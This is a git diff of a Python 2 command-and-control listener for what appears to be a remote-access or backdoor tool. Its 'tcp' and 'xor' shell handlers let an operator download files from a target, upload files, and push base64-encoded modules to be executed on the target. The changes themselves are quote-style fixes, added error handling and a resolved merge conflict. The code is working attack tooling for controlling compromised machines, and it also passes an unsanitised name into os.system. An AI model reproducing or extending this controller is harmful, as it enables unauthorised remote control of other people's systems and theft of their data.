@@ -50,26 +50,26 @@ class tcp:
         while True:
             data = conn.recv(socksize)
         
-            if data.startswith(':savef'):
+            if data.startswith(":savef"):
                 getname = data.split(" ")
                 fname = getname[1]
                 core.logging.info("Saving %s from %s" % (fname, name))
                 self.download(fname, name)
                 
-            elif data == ('Complete'):
+            elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
-            elif data == ('shell => '):
+            elif data == ("shell => "):
                 cmd = raw_input(data)
                 conn.sendall(str(cmd))
                 
-                if cmd == (':killme'):
+                if cmd == (":killme"):
                     print("[!] Shutting down server!")
                     core.logging.info("Shutting down %s completely." % name)
                     conn.close()
                     
-                elif cmd.startswith(':download'):
+                elif cmd.startswith(":download"):
                     try:
                         getname = cmd.split(" ")
                         fname = getname[1]
@@ -79,7 +79,7 @@ class tcp:
                     except IndexError:
                         print("[!] Must specify download file!")
                     
-                elif cmd.startswith(':upload'):
+                elif cmd.startswith(":upload"):
                     try:
                         getname = cmd.split(" ")
                         loc_file = getname[1]
@@ -89,7 +89,7 @@ class tcp:
                     except IndexError:
                         print("[!] Must specify upload file!")
                     
-                elif cmd.startswith(':exec'):
+                elif cmd.startswith(":exec"):
                     getname = cmd.split(" ")
                     modname = getname[1]
 
@@ -105,11 +105,11 @@ class tcp:
                     else:
                         print("[!] Module not found!")
                         
-                elif cmd == (':help'):
+                elif cmd == (":help"):
                     core.shell_help()
                     
-                elif cmd.startswith(':info'):
-                    getname = cmd.split(' ')
+                elif cmd.startswith(":info"):
+                    getname = cmd.split(" ")
                     modname = getname[1]
 
                     if os.path.exists(core.ModulesDir+modname):
@@ -127,15 +127,15 @@ class tcp:
                             else:
                                 pass
                                 
-                elif cmd == (':mods'):
+                elif cmd == (":mods"):
                     print("[+] Available Modules: ")
                     print core.Modules
                         
-                elif cmd == (':files'):
+                elif cmd == (":files"):
                     print("\n[+] Contents of Storage directory: ")
                     os.system("ls %s | grep %s" % (core.DownloadDir, name))
                     
-                elif cmd == (':quit'):
+                elif cmd == (":quit"):
                     print("[!] Closing shell connection.")
                     core.logging.info("Closing connection to %s" % name)
                     conn.close()
@@ -165,84 +165,97 @@ class tcp:
         while True:
             data = conn.recv(socksize)
         
-            if data.startswith(':savef'):
+            if data.startswith(":savef"):
                 getname = data.split(" ")
                 fname = getname[1]
                 core.logging.info("Saving %s from %s" % (fname, name))
                 self.download(fname, name)
                 
-            elif data == ('Complete'):
+            elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
-            elif data == ('shell => '):
+            elif data == ("shell => "):
                 cmd = raw_input(data)
                 conn.sendall(str(cmd))
                 
-                if cmd == (':killme'):
+                if cmd == (":killme"):
                     print("[!] Shutting down server!")
                     core.logging.info("Shutting down %s completely." % name)
                     conn.close()
                     
-                elif cmd.startswith(':download'):
-                    getname = cmd.split(" ")
-                    fname = getname[1]
-                    core.logging.info("Saving %s from %s." % (fname, name))
-                    self.download(fname, name)
+                elif cmd.startswith(":download"):
+                    try:
+                        getname = cmd.split(" ")
+                        fname = getname[1]
+                        core.logging.info("Saving %s from %s." % (fname, name))
+                        self.download(fname, name)
+                    except IndexError:
+                        print("[!] Must specify download file!")
                     
-                elif cmd.startswith(':upload'):
-                    getname = cmd.split(" ")
-                    loc_file = getname[1]
-                    core.logging.info("Uploading %s to %s." % (loc_name, name))
-                    self.upload(loc_file)
+                elif cmd.startswith(":upload"):
+                    try:
+                        getname = cmd.split(" ")
+                        loc_file = getname[1]
+                        core.logging.info("Uploading %s to %s." % (loc_name, name))
+                        self.upload(loc_file)
+                    except IndexError:
+                        print("[!] Must specify upload file!")
                     
-                elif cmd.startswith(':exec'):
-                    getname = cmd.split(" ")
-                    modname = getname[1]
+                elif cmd.startswith(":exec"):
+                    try:
+                        getname = cmd.split(" ")
+                        modname = getname[1]
 
-                    if os.path.exists(core.ModulesDir+modname):
-                        sendfile = open(core.ModulesDir+modname, "rb")         # read the file into buffer
-                        filedata = sendfile.read()
-                        sendfile.close()
-                        time.sleep(3)
-                        filedata = b64encode(filedata)                  # base64 encode file and send to server
-                        conn.sendall(filedata)
-                        core.logging.info("Executing %s on %s" % (modname, name))
-                        data = conn.recv(socksize)
-                    else:
-                        print("[!] Module not found!")
+                        if os.path.exists(core.ModulesDir+modname):
+                            sendfile = open(core.ModulesDir+modname, "rb")         # read the file into buffer
+                            filedata = sendfile.read()
+                            sendfile.close()
+                            time.sleep(3)
+                            filedata = b64encode(filedata)                  # base64 encode file and send to server
+                            conn.sendall(filedata)
+                            core.logging.info("Executing %s on %s" % (modname, name))
+                            data = conn.recv(socksize)
+                        else:
+                            print("[!] Module not found!")
+                            
+                    except IndexError:
+                        print("[!] Must specify module name!")
                         
-                elif cmd == (':help'):
+                elif cmd == (":help"):
                     core.shell_help()
                     
-                elif cmd.startswith(':info'):
-                    getname = cmd.split(' ')
-                    modname = getname[1]
+                elif cmd.startswith(":info"):
+                    try:
+                        getname = cmd.split(" ")
+                        modname = getname[1]
 
-                    if os.path.exists(core.ModulesDir+modname):
-                        info = open(core.ModulesDir+modname)
-                        for line in info:
-                            if "@description" in line:
-                                split = line.split(":")
-                                des = split[1]
-                                print("\nDescription: %s " % des)
-                            if "@author" in line:
-                                split = line.split(":")
-                                author = split[1]
-                                print("Author: %s " % author)              
-                                    
-                            else:
-                                pass
+                        if os.path.exists(core.ModulesDir+modname):
+                            info = open(core.ModulesDir+modname)
+                            for line in info:
+                                if "@description" in line:
+                                    split = line.split(":")
+                                    des = split[1]
+                                    print("\nDescription: %s " % des)
+                                if "@author" in line:
+                                    split = line.split(":")
+                                    author = split[1]
+                                    print("Author: %s " % author)              
+                                else:
+                                    pass
+                    
+                    except IndexError:
+                        print("[!] Must specify module name!")
                                 
-                elif cmd == (':mods'):
+                elif cmd == (":mods"):
                     print("[+] Available Modules: ")
                     print core.Modules
                         
-                elif cmd == (':files'):
+                elif cmd == (":files"):
                     print("\n[+] Contents of Storage directory: ")
                     os.system("ls %s | grep %s" % (core.DownloadDir, name))
                     
-                elif cmd == (':quit'):
+                elif cmd == (":quit"):
                     print("[!] Closing shell connection.")
                     core.logging.info("Closing connection to %s" % name)
                     conn.close()
@@ -301,11 +314,7 @@ class xor:
             data = xor(conn.recv(socksize), pin)
             
             if data.startswith(":savef"):
-<<<<<<< HEAD
-                getname = data2.split(" ")
-=======
                 getname = data.split(" ")
->>>>>>> e3965c2eb1501d8e704cb75068afc5fae257b152
                 fname = getname[1]
                 core.logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
@@ -318,60 +327,73 @@ class xor:
                 cmd = raw_input(data)
                 conn.sendall(xor(cmd, pin))
                 
-                if cmd == (':killme'):
+                if cmd == (":killme"):
                     print("[!] Shutting down server!")
                     conn.close()
                     
-                elif cmd == (':quit'):
+                elif cmd == (":quit"):
                     print("[!] Closing shell connection!")
                     conn.close()
                     
-                elif cmd.startswith(':download'):
-                    getname = cmd.split(" ")
-                    fname = getname[1]
-                    self.download(fname, name)
+                elif cmd.startswith(":download"):
+                    try:
+                        getname = cmd.split(" ")
+                        fname = getname[1]
+                        self.download(fname, name)
+                    except IndexError:
+                        print("[!] Must specify download file!")
                     
-                elif cmd.startswith(':upload'):
-                    getname = cmd.split(" ")
-                    loc_file = getname[1]
-                    self.upload(loc_file)
+                elif cmd.startswith(":upload"):
+                    try:
+                        getname = cmd.split(" ")
+                        loc_file = getname[1]
+                        self.upload(loc_file)
+                    except IndexError:
+                        print("[!] Must specify upload file!")
                     
-                elif cmd.startswith(':exec'):
-                    getname = cmd.split(" ")
-                    modname = getname[1]
+                elif cmd.startswith(":exec"):
+                    try:
+                        getname = cmd.split(" ")
+                        modname = getname[1]
                     
-                    if os.path.exists(ModulesDir+modname):
-                        sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
-                        filedata = sendfile.read()
-                        sendfile.close()
-                        time.sleep(3)
-                        filedata = b64encode(filedata)                  # base64 encode file and send to server
-                        conn.sendall(filedata)
-                        data = conn.recv(socksize)                    # wait to receive the OK msg from server
-                    else:
-                        pass
+                        if os.path.exists(ModulesDir+modname):
+                            sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
+                            filedata = sendfile.read()
+                            sendfile.close()
+                            time.sleep(3)
+                            filedata = b64encode(filedata)                  # base64 encode file and send to server
+                            conn.sendall(filedata)
+                            data = conn.recv(socksize)                    # wait to receive the OK msg from server
+                        else:
+                            pass
+                        
+                    except IndexError:
+                        print("[!] Must specify module name!")
                         
                 elif cmd == (":help"):
                     core.shell_help()
                     
                 elif cmd.startswith(":info"):
-                    getname = cmd.split(' ')
-                    modname = getname[1]
+                    try:
+                        getname = cmd.split(" ")
+                        modname = getname[1]
+
+                        if os.path.exists(core.ModulesDir+modname):
+                            info = open(core.ModulesDir+modname)
+                            for line in info:
+                                if "@description" in line:
+                                    split = line.split(":")
+                                    des = split[1]
+                                    print("\nDescription: %s " % des)
+                                if "@author" in line:
+                                    split = line.split(":")
+                                    author = split[1]
+                                    print("Author: %s " % author)              
+                                else:
+                                    pass
                     
-                    if os.path.exists(ModulesDir+modname):
-                        info = open(ModulesDir+modname)
-                        for line in info:
-                            if "@description" in line:
-                                split = line.split(":")
-                                des = split[1]
-                                print("\nDescription: %s " % des)
-                            if "@author" in line:
-                                split = line.split(":")
-                                author = split[1]
-                                print("Author: %s " % author)              
-                                    
-                            else:
-                                pass
+                    except IndexError:
+                        print("[!] Must specify module name!")
                                 
                 elif cmd == (":mods"):
                     print("[+] Available Modules: ")
@@ -422,60 +444,73 @@ class xor:
                 cmd = raw_input(data)
                 conn.sendall(xor(cmd, pin))
                 
-                if cmd == (':killme'):
+                if cmd == (":killme"):
                     print("[!] Shutting down server!")
                     conn.close()
                     
-                elif cmd == (':quit'):
+                elif cmd == (":quit"):
                     print("[!] Closing shell connection!")
                     conn.close()
                     
-                elif cmd.startswith(':download'):
-                    getname = cmd.split(" ")
-                    fname = getname[1]
-                    self.download(fname, name)
+                elif cmd.startswith(":download"):
+                    try:
+                        getname = cmd.split(" ")
+                        fname = getname[1]
+                        self.download(fname, name)
+                    except IndexError:
+                        print("[!] Must specify download file!")
                     
-                elif cmd.startswith(':upload'):
-                    getname = cmd.split(" ")
-                    loc_file = getname[1]
-                    self.upload(loc_file)
+                elif cmd.startswith(":upload"):
+                    try:
+                        getname = cmd.split(" ")
+                        loc_file = getname[1]
+                        self.upload(loc_file)
+                    except IndexError:
+                        print("[!] Must specify upload file!")
                     
-                elif cmd.startswith(':exec'):
-                    getname = cmd.split(" ")
-                    modname = getname[1]
+                elif cmd.startswith(":exec"):
+                    try:
+                        getname = cmd.split(" ")
+                        modname = getname[1]
                     
-                    if os.path.exists(ModulesDir+modname):
-                        sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
-                        filedata = sendfile.read()
-                        sendfile.close()
-                        time.sleep(3)
-                        filedata = b64encode(filedata)                  # base64 encode file and send to server
-                        conn.sendall(filedata)
-                        data = conn.recv(socksize)                    # wait to receive the OK msg from server
-                    else:
-                        pass
+                        if os.path.exists(ModulesDir+modname):
+                            sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
+                            filedata = sendfile.read()
+                            sendfile.close()
+                            time.sleep(3)
+                            filedata = b64encode(filedata)                  # base64 encode file and send to server
+                            conn.sendall(filedata)
+                            data = conn.recv(socksize)                    # wait to receive the OK msg from server
+                        else:
+                            pass
+                        
+                    except IndexError:
+                        print("[!] Must specify module name!")
                         
                 elif cmd == (":help"):
                     core.shell_help()
                     
                 elif cmd.startswith(":info"):
-                    getname = cmd.split(' ')
-                    modname = getname[1]
+                    try:
+                        getname = cmd.split(" ")
+                        modname = getname[1]
+
+                        if os.path.exists(core.ModulesDir+modname):
+                            info = open(core.ModulesDir+modname)
+                            for line in info:
+                                if "@description" in line:
+                                    split = line.split(":")
+                                    des = split[1]
+                                    print("\nDescription: %s " % des)
+                                if "@author" in line:
+                                    split = line.split(":")
+                                    author = split[1]
+                                    print("Author: %s " % author)              
+                                else:
+                                    pass
                     
-                    if os.path.exists(ModulesDir+modname):
-                        info = open(ModulesDir+modname)
-                        for line in info:
-                            if "@description" in line:
-                                split = line.split(":")
-                                des = split[1]
-                                print("\nDescription: %s " % des)
-                            if "@author" in line:
-                                split = line.split(":")
-                                author = split[1]
-                                print("Author: %s " % author)              
-                                    
-                            else:
-                                pass
+                    except IndexError:
+                        print("[!] Must specify module name!")
                                 
                 elif cmd == (":mods"):
                     print("[+] Available Modules: ")
